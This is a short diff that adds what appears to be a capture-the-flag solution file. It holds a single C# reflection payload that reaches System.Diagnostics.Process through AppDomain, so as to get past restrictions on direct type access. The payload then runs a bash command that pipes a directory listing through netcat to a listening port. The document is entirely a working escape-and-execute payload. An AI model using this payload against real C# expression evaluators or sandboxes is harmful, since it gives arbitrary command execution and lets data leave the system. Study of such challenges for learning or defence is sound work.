@@ -1,0 +1,2 @@
+Solution: 
+"".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[80].Invoke(null, "bash;-c 'ls | nc 0 9001'".Split(";".ToCharArray()))
